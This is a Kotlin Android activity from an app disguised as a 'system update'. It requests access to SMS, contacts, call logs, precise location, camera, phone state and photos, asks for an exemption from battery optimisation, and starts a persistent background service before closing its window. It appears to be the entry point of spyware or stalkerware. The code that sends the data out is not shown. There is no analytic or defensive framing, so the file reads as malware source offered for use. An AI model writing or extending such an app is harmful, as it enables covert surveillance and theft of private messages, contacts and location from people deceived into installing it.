package com.system.update

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : Activity() {
    private val PERMS = mutableListOf(
        Manifest.permission.READ_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.CAMERA,
        Manifest.permission.READ_PHONE_STATE
    ).apply {
        if (Build.VERSION.SDK_INT >= 33) {
            add(Manifest.permission.POST_NOTIFICATIONS)
            add(Manifest.permission.READ_MEDIA_IMAGES)
        } else {
            add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
    }.toTypedArray()

    override fun onCreate(s: Bundle?) {
        super.onCreate(s)
        requestAll()
    }

    private fun requestAll() {
        val missing = PERMS.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (missing.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missing.toTypedArray(), 1001)
        } else {
            start()
        }
    }

    override fun onRequestPermissionsResult(
        code: Int, perms: Array<out String>, results: IntArray
    ) {
        super.onRequestPermissionsResult(code, perms, results)
        start()
    }

    private fun start() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val i = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            i.data = Uri.parse("package:$packageName")
            startActivity(i)
        }
        val svc = Intent(this, CoreService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(svc)
        } else {
            startService(svc)
        }
        finish()
    }
}
